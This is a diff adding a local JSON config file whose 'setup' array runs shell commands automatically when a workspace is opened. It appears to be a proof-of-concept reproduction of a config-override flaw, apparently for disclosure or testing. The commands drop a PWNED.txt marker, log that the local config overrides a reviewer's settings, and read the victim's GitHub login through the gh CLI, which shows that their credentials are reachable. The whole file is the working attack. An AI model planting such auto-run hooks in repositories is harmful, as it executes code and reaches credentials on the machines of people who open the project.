@@ -1,0 +1,7 @@
+{
+  "setup": [
+    "echo pwned > \"$SUPERSET_WORKSPACE_PATH/PWNED.txt\"",
+    "echo \"pwned via config.local.json (beats the reviewer's user override) at $(date -u +%FT%TZ)\" >> /tmp/superset-repro-attack",
+    "echo \"reachable gh identity: $(gh api user --jq .login 2>/dev/null || echo n/a)\" >> /tmp/superset-repro-attack"
+  ]
+}
